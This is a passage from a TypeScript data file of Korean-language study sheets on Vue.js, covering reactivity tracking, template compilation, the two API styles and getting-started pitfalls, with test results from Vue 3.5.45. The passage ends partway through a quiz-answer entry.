import type { Theory } from ".";

/**
 * Vue — vuejs.org 의 목차를 그대로 따른다.
 *
 * 가이드(시작하기 · 필수 개념 · 컴포넌트 심화 · 재사용성 · 내장 컴포넌트 · 확장하기 · 베스트 프랙티스 ·
 * TypeScript · 추가 주제)와 API 참고서(글로벌 · Composition · Options · 내장 · SFC · 고급), 그리고 튜토리얼 ·
 * 예제 · 스타일 가이드. 노드 하나가 문서의 페이지 하나다(가이드·API), 또는 갈래 하나다(튜토리얼·예제·스타일).
 * 시트는 그 페이지가 무엇을 말하는지 → 실제로 돌려 본 결과 → 그 자리에서 나는 사고 → 사고의 구조 →
 * 다음 입구 → 확인 질문 순서로 적는다. i18n·렌더링·JavaScript·React 노드와 같은 틀이다.
 * '실제로 돌려 보면'은 Vue 3.5.45 를 Node 24(@vue/server-renderer · @vue/compiler-dom · @vue/compiler-sfc)와
 * Chrome 156(vue.esm-browser.js, 컴파일러 포함 개발 빌드)에서 돌린 결과다.
 */

const DOCS = "https://vuejs.org";
const KO = "https://ko.vuejs.org";

export const vueTheories: Theory[] = [
  {
    id: "vue",
    name: "Vue",
    tagline: "무엇이 바뀌었는지를 화면이 아니라 값에서 아는 도구",
    intro:
      "React와 같은 자리에서 출발합니다. 데이터가 이러면 화면은 이렇게 생겼다고 쓰고, 바꾸는 일은 프레임워크가 맡습니다. 갈리는 곳은 '무엇이 바뀌었는지'를 알아내는 방법입니다. React는 컴포넌트를 다시 불러 결과를 견주고, Vue는 값을 읽는 순간을 기록해 두었다가 그 값이 바뀌면 기록된 곳만 다시 돌립니다. 이 차이 하나에서 문서의 순서와 API의 모양이 갈라져 나옵니다. 이 노드 아래의 시트들은 vuejs.org의 목차를 그대로 따릅니다. 가이드 아홉 장(페이지 50), API 참고서 여섯 갈래(페이지 28), 튜토리얼·예제·스타일 가이드. 각 시트에 Vue 3.5.45를 실제로 돌려 본 결과를 붙였습니다.",
    blocks: [
      {
        label: "반응성은 비교가 아니라 추적이다",
        body: "ref()와 reactive()가 돌려주는 값은 Proxy로 감싸여 있습니다. 렌더 함수나 computed, watch 같은 이펙트가 그 값을 읽으면 '이 이펙트는 이 값에 기대고 있다'가 기록되고, 값을 쓰면 기록된 이펙트만 다시 실행됩니다. 그래서 Vue에는 의존성 배열이 없습니다. 무엇에 기대는지를 개발자가 적는 대신 런타임이 읽는 순간에 알아냅니다. 반대로 말하면, 읽지 않은 값은 추적되지 않습니다. 구조 분해로 꺼내 둔 원시값이 갱신을 놓치는 것도 그 때문입니다.",
        code: "import { ref, computed } from 'vue';\n\nconst count = ref(0);\n// count를 읽는 순간 의존이 기록된다\nconst double = computed(() => count.value * 2);\n\ncount.value++; // 기록된 double만 다시 계산된다",
      },
      {
        label: "템플릿은 컴파일러를 거친다",
        body: "싱글 파일 컴포넌트의 <template>은 빌드 시점에 렌더 함수로 바뀝니다. 그때 컴파일러가 정적인 부분과 동적인 부분을 미리 갈라 두고, 동적인 노드에는 무엇이 바뀔 수 있는지(클래스만, 텍스트만, 속성만) 표시를 남깁니다. 런타임의 가상 DOM 비교는 그 표시만 보고 나머지를 건너뜁니다. 문서는 이걸 '컴파일러가 알려주는 가상 DOM'이라 부릅니다. JSX가 런타임에 전부를 다시 만드는 것과 대비되는 자리입니다.",
      },
      {
        label: "API가 둘인 이유",
        body: "Options API는 data·methods·computed처럼 정해진 칸에 나눠 적는 방식이고, Composition API는 setup 안에서 함수로 조립하는 방식입니다. 둘은 같은 런타임 위에 있고, Options API는 Composition API 위에 구현되어 있습니다. 문서는 모든 예제를 두 방식으로 함께 보여주되, 빌드 도구와 싱글 파일 컴포넌트를 쓰는 경우에는 Composition API와 <script setup>을 권합니다. 로직을 옵션 칸이 아니라 관심사로 묶을 수 있고, 그 묶음을 함수(컴포저블)로 꺼내 다시 쓸 수 있기 때문입니다.",
        code: "<script setup lang=\"ts\">\nimport { ref } from 'vue';\n\nconst props = defineProps<{ label: string }>();\nconst open = ref(false);\n</script>\n\n<template>\n  <button @click=\"open = !open\">{{ props.label }}</button>\n</template>",
      },
      {
        label: "문서가 갈라 놓은 다섯 갈래",
        body: "가이드, API 참고서, 튜토리얼, 예제, 스타일 가이드입니다. React처럼 배우는 곳(가이드)과 찾아보는 곳(API)이 나뉘어 있고, 그 밖에 손으로 따라 치는 튜토리얼과 완성된 코드를 보는 예제가 따로 있습니다. 그래프에는 가이드와 API를 문서 목차 그대로 옮기고, 나머지 셋은 갈래만 세워 뒀습니다.",
      },
      {
        label: "실제로 돌린 것",
        body: "이 노드 아래의 '실제로 돌려 보면'은 Vue 3.5.45입니다. Node 24에서 @vue/server-renderer(renderToString·renderToWebStream), @vue/compiler-dom(템플릿 → 렌더 함수, 패치 플래그·호이스팅·에러), @vue/compiler-sfc(<script setup> 매크로가 무엇으로 바뀌나, scoped CSS가 어떻게 바뀌나)를 돌렸고, Chrome 156에서 vue.esm-browser.js(컴파일러 포함 개발 빌드, 575,931바이트. 운영 빌드는 177,765바이트)로 생명주기 순서·묶음 갱신·flush·템플릿 ref·v-model 수식어·이벤트 수식어·Transition 클래스 타임라인·TransitionGroup move·KeepAlive LRU·Teleport·Suspense·비동기 컴포넌트·errorHandler info·props 경고·in-DOM 템플릿 함정·하이드레이션 불일치·useId를 측정했습니다. 수치는 그 환경의 것이고, 경고 문구는 그대로 옮겼습니다.",
        code: "환경                        확인한 것\nNode 24 · vue 3.5.45         ref/reactive/computed/watch 의미 · effectScope · customRef · SSR(렌더 · 생명주기 · provide · Suspense · Teleport · useId · 요청 간 오염) · props 검증 경고 · 컴파일 출력(패치 플래그 · 캐시 · v-model) · 컴파일 에러 · SFC 매크로 · scoped CSS\nChrome 156 · esm-browser     생명주기 · 묶음 · flush pre/post/sync · 템플릿 ref · v-model 수식어 · 이벤트 수식어 순서 · Transition 프레임 · TransitionGroup · KeepAlive · Teleport · Suspense · async 컴포넌트 · errorHandler · in-DOM 함정 · 하이드레이션 · useId\n\n빌드 크기:  vue.esm-browser.js 575,931 B (개발 · 컴파일러 포함)  ·  vue.esm-browser.prod.js 177,765 B",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 추적은 '읽는 순간' 에만 일어난다",
        body: "이 노드의 거의 모든 사고는 한 문장으로 돌아옵니다. 추적은 반응형 프록시의 프로퍼티를 '읽는 순간'에만 기록된다. 구조 분해로 꺼내면 읽는 순간이 지나가 끊기고(필수 개념 > 반응성 기초), watchEffect의 await 뒤는 읽어도 기록되지 않고(감시자), 템플릿의 중첩 ref는 풀리지 않아 [object Object]가 되고(반응성 기초), 서버에서는 추적이 꺼져 갱신이 없고(SSR), 컴파일러는 어느 바인딩이 동적인지 미리 알아 그것만 비교합니다(렌더링 메커니즘). React의 '순수 함수를 다시 부른다'와 대비해 Vue는 '읽은 자리를 기억한다'이고, 그래서 사고의 모양도 '기억되지 않은 자리'에서 납니다.",
        code: "읽는 순간                      기록됨                  사고\nstate.n (프록시 프로퍼티)        ✓ 이펙트 ← state.n       —\nconst { n } = state (구조 분해)   ✗ 값만 복사              n 이 안 바뀜 (실제로 effect 로그에 없음)\nawait 뒤 b.value                ✗ 동기 구간 밖           watchEffect 가 b 를 모름 (실제로 runs 2 로 멈춤)\n{{ obj.id + 1 }} (중첩 ref)      ✓ 하지만 풀리지 않음       '[object Object]1' (실제로)\n서버 렌더 중                    ✗ 추적 꺼짐             watchEffect 초기 1회만 (실제로 runs 1)\n컴파일러가 본 정적 노드           — 비교 자체를 건너뜀       -1 /* CACHED */ (실제로)",
        codeLang: "text",
      },
    ],
    sources: [
      { label: "Introduction", href: `${DOCS}/guide/introduction` },
      { label: "Reactivity in Depth", href: `${DOCS}/guide/extras/reactivity-in-depth` },
      { label: "Rendering Mechanism", href: `${DOCS}/guide/extras/rendering-mechanism` },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // 가이드 (Guide)
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: "vg",
    name: "가이드",
    tagline: "순서대로 읽도록 짜인 쪽",
    intro:
      "가이드는 아홉 장으로 나뉘어 있고, 앞의 세 장은 이어서 읽는 것을 전제로 씁니다. 시작하기에서 소개와 빠른 시작을 지나면, 필수 개념이 애플리케이션 생성부터 라이프사이클 훅까지 열세 페이지로 이어지고, 그다음이 컴포넌트 심화입니다. 뒤의 여섯 장은 필요할 때 들르는 곳입니다. 이 노드의 자식 아홉이 그 아홉 장이고, 각 장 아래 노드가 페이지입니다. 페이지 50입니다.",
    blocks: [
      {
        label: "필수 개념은 한 줄로 이어진다",
        body: "애플리케이션 생성, 템플릿 문법, 반응성 기초, 계산된 속성, 클래스와 스타일 바인딩, 조건부 렌더링, 리스트 렌더링, 이벤트 처리, 폼 입력 바인딩, 감시자, 템플릿 ref, 컴포넌트 기초, 라이프사이클 훅. 값을 만드는 법(반응성)이 먼저 나오고, 그 값을 화면에 붙이는 법(바인딩·렌더링)이 다음이고, 화면에서 값으로 되돌아오는 길(이벤트·폼)이 그다음입니다. 컴포넌트는 그 뒤에야 나옵니다.",
      },
      {
        label: "컴포넌트 심화와 재사용성이 갈라진 이유",
        body: "컴포넌트 심화는 컴포넌트 사이의 경계를 다룹니다. Props로 내려보내고, 이벤트로 올려보내고, v-model로 둘을 묶고, 슬롯으로 내용을 넘기고, provide/inject로 건너뜁니다. 재사용성은 그 경계를 넘어 로직 자체를 꺼내는 장입니다. 컴포저블, 커스텀 디렉티브, 플러그인이 여기 있습니다. 컴포넌트를 쪼개는 것과 로직을 꺼내는 것이 다른 일이라는 구분이 목차에 들어 있습니다.",
      },
      {
        label: "'왜'는 맨 뒤에 있다",
        body: "반응성 심화, 렌더링 메커니즘, 렌더 함수와 JSX 같은 내부 이야기는 추가 주제로 맨 끝에 있습니다. 앞에서는 ref와 템플릿이 그냥 동작하는 것으로 다루고, 그것이 어떻게 동작하는지는 필요한 사람만 읽도록 뒤로 뺐습니다. React 문서가 탈출구를 맨 끝에 둔 것과 같은 배치입니다.",
      },
      {
        label: "두 API를 한 문서로 읽는 법",
        body: "가이드 전체가 Options API와 Composition API 두 벌로 쓰여 있고, 사이드바의 토글로 한쪽만 볼 수 있습니다. 빌드 도구를 쓰는 프로젝트라면 Composition API로 두고 읽는 편이 API 참고서와 연결이 자연스럽습니다. 참고서 쪽도 Composition API와 Options API가 나란히 갈려 있기 때문입니다.",
      },
      {
        label: "아홉 장 한눈에: 각 장의 대표 사고",
        body: "장마다 '그 장을 몰라서 나는 사고' 하나를 붙였습니다. 시작하기: in-DOM 템플릿의 자기 닫힘 태그가 뒤 형제를 삼킨다(실제로 <my-row/> 뒤의 <span>과 <table>이 사라졌습니다). 필수 개념: 구조 분해가 반응성을 끊는다, v-if와 v-for를 한 요소에 둔다, watch에 getter 대신 값을 넘긴다. 컴포넌트 심화: props를 자식에서 고친다(경고), emits를 선언하지 않아 네이티브 click이 두 번 울린다, 다중 루트에 class를 넘긴다(경고). 재사용성: 컴포저블을 setup 밖에서 부른다. 내장 컴포넌트: Transition에 자식 둘(경고), TransitionGroup에 key 없음(경고), Teleport 타깃이 아직 없다(경고). 확장하기: SSR에서 모듈 전역 상태가 요청 사이에 샌다(실제로 shared=1 → 2). 베스트 프랙티스: v-html에 사용자 입력. TypeScript: 구조 분해한 prop을 watch에 넘긴다(컴파일 에러). 추가 주제: 매번 새 객체를 돌려주는 computed가 안정성을 깬다(실제로 effect 3회).",
        code: "장              페이지                                       대표 사고 (실제로 돌려 본 것)\n시작하기          소개 · 빠른 시작                               in-DOM <my-row/> 가 뒤 형제를 삼킴 · <MyRow> 가 소문자로\n필수 개념         13 (앱 · 템플릿 · 반응성 · computed · … · 라이프사이클)   구조 분해 끊김 · v-if+v-for · watch(obj.count) · {{ obj.id + 1 }} → [object Object]1\n컴포넌트 심화      8 (등록 · props · 이벤트 · v-model · attrs · 슬롯 · provide · async)   props 쓰기 경고 · emits 미선언 → 네이티브 click 폴스루 · 다중 루트 attrs 경고\n재사용성          3 (컴포저블 · 디렉티브 · 플러그인)                   setup 밖 컴포저블 · 다중 루트에 디렉티브 경고\n내장 컴포넌트      5 (Transition · TransitionGroup · KeepAlive · Teleport · Suspense)   자식 둘 · key 없음 · 타깃 없음 경고 · max LRU 로 상태 소실\n확장하기          6 (SFC · 툴링 · 라우팅 · 상태 · 테스트 · SSR)            모듈 전역 상태 요청 간 오염 · 서버에서 추적 꺼짐 · 하이드레이션 불일치\n베스트 프랙티스     4 (배포 · 성능 · 접근성 · 보안)                      v-html 사용자 입력 · 새 객체 computed\nTypeScript        3 (개요 · Composition · Options)                   watch(구조분해 prop) 컴파일 에러 · reactive 제네릭\n추가 주제          7 (사용 방법 · FAQ · 반응성 심화 · 렌더링 · 렌더 함수 · 웹 컴포넌트 · 애니메이션)   await 뒤 미추적 · 패치 플래그 모르고 성능 추측",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "자식 아홉 장으로 들어갑니다. 순서대로 읽을 것은 시작하기 → 필수 개념 → 컴포넌트 심화이고, 나머지는 필요할 때입니다. API 참고서(va)는 같은 개념을 시그니처로 적은 쪽이라 가이드의 각 시트 끝에 해당 API 노드를 가리켜 두었습니다.",
      },
    ],
    sources: [
      { label: "Guide", href: `${DOCS}/guide/introduction` },
      { label: "Composition API FAQ", href: `${DOCS}/guide/extras/composition-api-faq` },
    ],
  },

  {
    id: "vg-start",
    name: "시작하기",
    tagline: "소개와 빠른 시작: Vue 가 무엇이고, 어떻게 첫 줄을 돌리나",
    intro:
      "가이드의 첫 장은 두 페이지입니다. 소개(Vue가 무엇인가, 선언적 렌더링과 반응성, 점진적 프레임워크, SFC, 두 API 스타일)와 빠른 시작(create-vue로 프로젝트 만들기, CDN·ES 모듈·임포트 맵으로 빌드 없이 쓰기). 이 둘이 뒤의 모든 장이 전제하는 어휘와 환경을 정합니다. 실제로 돌려 보면 빌드 없이 쓰는 브라우저 빌드는 컴파일러를 포함해 575,931바이트, 운영 빌드는 177,765바이트였고, in-DOM 템플릿(HTML 안에 직접 쓴 템플릿)은 브라우저 파서를 먼저 거쳐 <MyRow>가 <myrow>로, <my-row/>가 뒤 형제를 삼키는 형태로 바뀌어 있었습니다.",
    blocks: [
      {
        label: "무엇이 들어 있나",
        body: "소개: 'Vue는 사용자 인터페이스를 만들기 위한 자바스크립트 프레임워크'이고 핵심 둘은 선언적 렌더링(상태를 바탕으로 HTML을 선언)과 반응성(상태 변화를 추적해 DOM을 갱신). 점진적 프레임워크라 정적 HTML 강화, 웹 컴포넌트, SPA, SSR, SSG, 데스크톱·모바일·WebGL·터미널까지 씁니다. SFC(*.vue)는 '빌드 설정이 정당화되는 경우' 권장. Options API(data·methods·mounted, this)와 Composition API(import한 함수, <script setup>)는 같은 시스템이고 Options가 Composition 위에 구현돼 있습니다. 문서의 추천: 빌드 도구 없이 쓰거나 복잡도가 낮으면 Options, 전체 애플리케이션이면 Composition + SFC. 'Vue 2 지원은 2023년 12월 31일에 끝났다'. 빠른 시작: Node ^22.18.0 || >=24.12.0, npm create vue@latest(create-vue), 빌드 산출물 ./dist. CDN은 vue.global.js(전역 Vue), vue.esm-browser.js(<script type=\"module\">), 임포트 맵(Safari 16.4+). CDN에서는 SFC 문법을 못 쓰고, 예제는 개발 빌드이며, ES 모듈은 file://에서 안 돕니다.",
        code: "// 빌드 있는 길\nnpm create vue@latest     # create-vue · Vite · TS/Router/Pinia/Vitest 선택\nnpm run dev / npm run build  → ./dist\n\n// 빌드 없는 길 셋\n<script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script>            // 전역 Vue — Vue.createApp(…)\n<script type=\"module\">import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js'</script>\n<script type=\"importmap\">{ \"imports\": { \"vue\": \"https://unpkg.com/vue@3/dist/vue.esm-browser.js\" } }</script>   // import … from 'vue'\n\n// 공통 제약: SFC 불가 · 개발 빌드 (운영은 .prod.js) · file:// 불가 (npx serve)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "브라우저 빌드 둘의 크기를 재니 vue.esm-browser.js 575,931바이트(개발, 템플릿 컴파일러 포함), vue.esm-browser.prod.js 177,765바이트였습니다. 빌드 도구를 쓰면 템플릿이 미리 컴파일되어 런타임 전용 빌드(문서: 컴파일러 약 14kb 절약)를 씁니다. in-DOM 템플릿을 시험했습니다. 컨테이너 innerHTML에 <my-row></my-row> <MyRow></MyRow> <my-row/> <span>뒤</span> <table><tr is=\"vue:my-row\"></tr><my-row></my-row></table>를 적고 createApp({ components: { MyRow } }).mount(el)로 그 innerHTML을 템플릿으로 쓰게 했습니다. 브라우저 파서가 먼저 손을 댑니다. <MyRow>는 <myrow>로 소문자가 되어 'Failed to resolve component: myrow', <my-row/>는 자기 닫힘이 무시되어 열린 태그가 되고 뒤의 <span>과 <table>이 그 안으로 들어가 결과에서 사라졌으며, <table> 안의 <my-row>는 테이블 밖으로 끌려 나왔습니다. <tr is=\"vue:my-row\">만 제자리에서 컴포넌트가 됐습니다. SFC·문자열 템플릿에는 이 함정이 없습니다. 파서를 안 거치기 때문입니다.",
        code: "// 크기 (vue 3.5.45 dist)\nvue.esm-browser.js        575,931 B   개발 · 컴파일러 포함\nvue.esm-browser.prod.js   177,765 B   운영\n\n// in-DOM 템플릿 — 파서가 먼저 본 것 (Chrome 156)\n적은 것:   <my-row></my-row> <MyRow></MyRow> <my-row/> <span id=\"after\">뒤</span> <table><tr is=\"vue:my-row\"></tr><my-row></my-row></table>\n파서 뒤:   <my-row></my-row> <myrow></myrow> <my-row> <span id=\"after\">뒤</span> <my-row></my-row><table><tbody><tr is=\"vue:my-row\"></tr></tbody></table></my-row>\n           ↑ 소문자          ↑ 자기 닫힘 무시 → 뒤가 전부 자식으로          ↑ table 밖으로 끌려 나옴\n렌더 결과: <p class=\"row\">행</p> <myrow></myrow> <p class=\"row\">행</p>      + warn: Failed to resolve component: myrow\n           (span 과 table 은 세 번째 my-row 의 자식이 되어 사라졌다)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 두 갈래의 입구는 '템플릿을 누가 먼저 읽나' 로 갈린다",
        body: "빌드 있는 길은 템플릿을 Vue 컴파일러가 먼저 읽습니다. 그래서 대소문자·자기 닫힘·배치 제약이 없고, 런타임에 컴파일러가 필요 없어 작습니다. 빌드 없는 길은 HTML 파서가 먼저 읽고 그 결과(DOM의 innerHTML)를 Vue가 받습니다. 그래서 HTML의 규칙(소문자, 자기 닫힘 없음, table 안에는 tr만)이 템플릿에 적용되고, 런타임에 컴파일러가 들어 있어 큽니다. 소개의 '점진적'이 뜻하는 것이 이 두 입구를 다 열어 둔 것이고, 빠른 시작이 둘을 나란히 적은 이유입니다. 자식 둘이 각각을 다룹니다.",
        code: "빌드 있음  .vue ──@vue/compiler-sfc──▶ 렌더 함수 ──▶ 런타임 전용 빌드 (작음)          템플릿을 Vue 가 먼저 읽음 → HTML 규칙 무관\n빌드 없음  HTML ──브라우저 파서──▶ DOM.innerHTML ──▶ 런타임 컴파일러 (575KB 개발)       HTML 이 먼저 읽음 → 소문자 · 자기 닫힘 X · table 배치 · is=\"vue:\"",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "자식 둘, 소개와 빠른 시작으로 들어갑니다. 그다음은 필수 개념 열세 페이지입니다.",
      },
    ],
    sources: [
      { label: "Introduction", href: `${DOCS}/guide/introduction` },
      { label: "Quick Start", href: `${DOCS}/guide/quick-start` },
    ],
  },

  {
    id: "vg-start-intro",
    name: "소개",
    tagline: "선언적 렌더링과 반응성, 그리고 두 API 스타일",
    intro:
      "가이드의 첫 페이지입니다. Vue가 무엇인지를 두 핵심 기능으로 정의합니다. 선언적 렌더링(자바스크립트 상태를 바탕으로 HTML 출력을 선언)과 반응성(상태 변화를 자동으로 추적해 DOM을 효율적으로 갱신). 그리고 점진적 프레임워크, 싱글 파일 컴포넌트, 두 API 스타일(Options·Composition)과 어느 쪽을 고를지. 실제로 돌려 보면 반응성은 '읽는 순간 기록'이었습니다. watchEffect가 state.n을 읽으면 n이 바뀔 때만 다시 돌고(effect 로그 n=0, n=1), 구조 분해한 값은 바뀌어도 돌지 않았습니다. computed는 읽기 전에는 계산하지 않고(생성 직후 runs 0) 두 번 읽어도 한 번만 계산했습니다(runs 1). 이 노드의 질문은 하나입니다. Vue가 '안다'는 것은 무엇을 어떻게 아는 것인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "문서의 정의: 'Vue는 사용자 인터페이스를 만들기 위한 자바스크립트 프레임워크다. 표준 HTML·CSS·JS 위에 서서 선언적이고 컴포넌트 기반의 프로그래밍 모델을 제공한다.' 핵심 둘. 선언적 렌더링: 템플릿 문법으로 JS 상태에 따른 HTML을 선언한다. 반응성: 상태 변화를 추적해 바뀌면 DOM을 갱신한다. 점진적 프레임워크: 빌드 없이 정적 HTML 강화, 웹 컴포넌트로 끼우기, SPA, 풀스택 SSR, SSG, 데스크톱·모바일·WebGL·터미널. SFC: HTML 비슷한 파일에 템플릿·로직·스타일을 담고 빌드 도구가 컴파일한다. API 스타일 둘: Options API는 data·methods·mounted 같은 옵션 객체와 this, Composition API는 import한 함수로 setup 안에서 조립(<script setup>). 'Options API는 Composition API 위에 구현돼 있다.' 추천: 배울 때는 쉬운 쪽. 운영은 빌드 도구 없음·낮은 복잡도면 Options, 전체 앱이면 Composition + SFC. 'Vue 2 지원은 2023-12-31에 종료'.",
        code: "<!-- 선언적 렌더링: 상태 → HTML 을 선언한다. 어떻게 바꿀지는 안 적는다 -->\n<div id=\"app\">\n  <button @click=\"count++\">Count is: {{ count }}</button>\n</div>\n\n// Options API                         // Composition API (<script setup>)\nexport default {                        import { ref, onMounted } from 'vue'\n  data() { return { count: 0 } },       const count = ref(0)\n  methods: { increment() { this.count++ } },   function increment() { count.value++ }\n  mounted() { console.log(this.count) }        onMounted(() => console.log(count.value))\n}\n// 같은 런타임 · Options 는 Composition 위에 구현",
        terms: [
          {
            term: "선언적 렌더링 (declarative rendering)",
            body: "'지금 상태가 이러면 화면은 이렇다'를 적는 방식입니다. 반대는 명령적(imperative)으로 'DOM의 이 노드를 찾아 텍스트를 바꿔라'를 적는 것. 선언적이면 상태만 바꾸고 화면은 프레임워크가 맞춥니다. 그래서 '상태 변화를 어떻게 알아내나'가 프레임워크의 핵심 문제가 되고, Vue의 답이 반응성(추적)입니다.",
          },
          {
            term: "반응성 (reactivity)",
            body: "상태를 읽은 자리를 기록해 두고, 그 상태가 바뀌면 기록된 자리만 다시 실행하는 체계입니다. Vue 3는 객체를 Proxy로 감싸 읽기(get)에서 track, 쓰기(set)에서 trigger를 합니다. ref는 .value의 getter·setter가 그 역할입니다. '읽는 순간'에만 기록되므로 구조 분해로 꺼낸 값, await 뒤에 읽은 값, 서버 렌더 중의 값은 기록되지 않습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: '추적' 의 모양",
        body: "Node에서 reactive({ n: 0 })를 만들고 watchEffect(() => seen.push('effect n=' + state.n))를 걸었습니다. 즉시 한 번 돌아 n=0, state.n++ 뒤 다시 돌아 n=1. 구조 분해한 let { n } = state에 n++를 해도 효과는 돌지 않았고 state.n도 그대로였습니다. 복사된 값이라 프록시를 거치지 않기 때문입니다. 반면 const nested = state.nested는 중첩 객체의 프록시라 isReactive가 true였습니다. computed(() => a.value * 2)는 만든 직후 runs 0, 두 번 읽어도 runs 1(캐시), a를 바꾸고 읽기 전까지 runs 1, 읽으면 runs 2. 지연 평가와 캐시입니다. reactive(1)은 '[Vue warn] value cannot be made reactive: 1'로 원시값은 못 감쌉니다. Set·Map은 reactive로 감싸져 add·set이 추적됩니다. 브라우저에서는 같은 틱의 a=1, b=1, a=2 세 번 쓰기가 렌더 한 번(renders 2 → 초기 포함)으로 묶였고 DOM은 nextTick 뒤에 '2-1'이었습니다.",
        code: "// Node 24 · vue 3.5.45\nconst state = reactive({ n: 0 }); watchEffect(() => seen.push('effect n=' + state.n));\nstate.n++  → seen: ['effect n=0', 'effect n=1']\nlet { n } = state; n++  → 효과 안 돎 · state.n 그대로 (복사된 값)\nisReactive(state.nested) → true (중첩 객체는 프록시)\n\nconst c = computed(() => a.value * 2)   // runs 0 (지연) → c.value c.value → runs 1 (캐시) → a.value = 2 → runs 1 → c.value → runs 2\nreactive(1) → 1 + warn: value cannot be made reactive: 1\nreactive(new Set([1])).add(2) → isReactive true · size 2\n\n// Chrome 156 — 묶음\na.value = 1; b.value = 1; a.value = 2;   동기 코드 끝: DOM '0-0' renders 1 → nextTick 뒤: DOM '2-1' renders 2",
      },
      {
        label: "문제: 'Vue 가 바뀐 걸 모른다'",
        body: "컴포저블이 reactive 객체를 돌려주고 호출하는 쪽이 const { count } = useCounter()로 받았습니다. 버튼을 눌러 count를 올려도 화면이 그대로입니다. 구조 분해는 그 순간의 값을 복사하므로 이후 변경은 프록시를 거치지 않습니다. 실제로 돌려 보면 구조 분해한 n은 바뀌어도 효과가 돌지 않았습니다. 처방은 셋 중 하나입니다. 컴포저블이 ref들을 담은 plain 객체를 돌려주고(문서의 관례) 호출 쪽은 ref 단위로 구조 분해, 또는 toRefs(state)로 풀어 돌려주기, 또는 구조 분해하지 않고 state.count로 읽기. 반응성은 '값'이 아니라 '읽는 길'에 있습니다. 그 길이 프록시나 ref의 .value를 지나야 기록됩니다.",
      },
      {
        label: "문제가 나는 경우: 선언과 추적을 명령형으로 생각할 때",
        body: "경우 ㄱ, 구조 분해입니다. 위의 사고입니다. 경우 ㄴ, 원시값을 reactive에 넣습니다. 경고와 함께 그대로 돌아옵니다. ref로. 경우 ㄷ, 반응형 객체를 통째로 교체합니다(state = reactive({...})). 변수만 바뀌고 옛 프록시를 읽던 자리는 끊깁니다. 프로퍼티를 바꾸거나 ref.value로 교체. 경우 ㄹ, DOM을 직접 고치고 Vue가 알기를 기대합니다. Vue는 상태만 봅니다. 상태를 바꾸면 DOM은 따라옵니다. 경우 ㅁ, 상태를 바꾸고 바로 DOM을 읽습니다. 갱신은 묶여 다음 틱입니다. await nextTick(). 경우 ㅂ, 두 API를 한 컴포넌트에 섞어 this와 setup 반환값을 혼동합니다. 문서는 이전 코드 통합 외에는 섞지 말라고 합니다. 경우 ㅅ, 빌드 없는 자리에서 SFC 문법을 쓰려 합니다. CDN에서는 못 씁니다. 경우 ㅇ, computed가 안 바뀝니다. Date.now()처럼 반응형이 아닌 것만 읽으면 다시 계산할 이유가 없습니다. 경우 ㅈ, Options API가 폐기될 거라 믿습니다. 문서는 '그럴 계획이 없다'고 적습니다.",
        code: "경우               언제 생기나                        겉모습                              처방\nㄱ 구조 분해        const { n } = state                 화면 안 바뀜                          ref 단위 · toRefs · state.n\nㄴ 원시값 reactive   reactive(1)                        warn: value cannot be made reactive    ref(1)\nㄷ 통째 교체        state = reactive({…})               옛 프록시 읽던 자리 끊김                 프로퍼티 변경 · ref.value 교체\nㄹ DOM 직접 수정     el.textContent = …                 다음 렌더에 덮어씌워짐                   상태를 바꾼다\nㅁ 바로 DOM 읽기     set 뒤 el.textContent               옛 값 (실제로 '0-0')                  await nextTick()\nㅂ API 혼용         this 와 setup 혼동                   undefined                           한쪽으로\nㅅ CDN 에 SFC       <template> 블록 기대                안 됨                                빌드 도구\nㅇ computed 고정     Date.now() 만 읽음                  처음 값 유지                          반응형 소스 · 메서드\nㅈ Options 폐기 걱정  -                                  -                                   문서: 계획 없음",
        codeLang: "text",
      },
      {
        label: "문제의 구조: '선언' 은 상태에, '추적' 은 읽는 길에 있다",
        body: "선언적 렌더링은 '상태 → 화면'을 적는 것이라 화면을 직접 만지면 선언이 깨지고(ㄹ), 상태를 바꾼 뒤 화면은 다음 틱에 따라옵니다(ㅁ). 반응성은 상태를 '읽는 길'(프록시 프로퍼티, ref.value)을 기록하는 것이라 길을 안 지나면(구조 분해 ㄱ, 원시값 ㄴ, 교체 ㄷ) 기록이 없습니다. 두 API 스타일은 같은 추적 위에 이름만 다른 길(this.count vs count.value)이고, 빌드 유무는 템플릿을 누가 먼저 읽나의 차이입니다. 소개 페이지가 두 핵심 기능을 먼저 말하는 이유가 여기 있습니다. 뒤의 모든 장은 이 둘의 세부입니다.",
        code: "선언:  상태 ──▶ 화면      화면을 직접 만지면 깨짐 (ㄹ) · 따라오는 건 다음 틱 (ㅁ)\n추적:  읽는 길을 기록       프록시 프로퍼티 · ref.value 를 지나야 함 → 구조 분해 (ㄱ) · 원시값 (ㄴ) · 교체 (ㄷ) 는 길 밖\n\nOptions (this.count)  ≡  Composition (count.value)  — 같은 추적, 다른 이름\n빌드 있음 / 없음  — 템플릿을 Vue 가 먼저 / HTML 파서가 먼저",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '빠른 시작'은 두 입구(create-vue, CDN)의 실제 명령과 제약입니다. 실제로 돌려 보면 in-DOM 템플릿은 HTML 파서의 규칙을 그대로 받았습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 레거시 jQuery 페이지의 폼 하나에만 Vue를 쓰려 합니다. 어느 입구와 어느 API가 맞을까요? (2) 그 폼의 상태 객체를 const { email } = form으로 꺼내 썼는데 입력해도 안 바뀝니다. 왜일까요? (3) 상태를 바꾼 직후 입력창 길이를 재야 합니다. 어디서?",
        notes: [
          {
            title: "답",
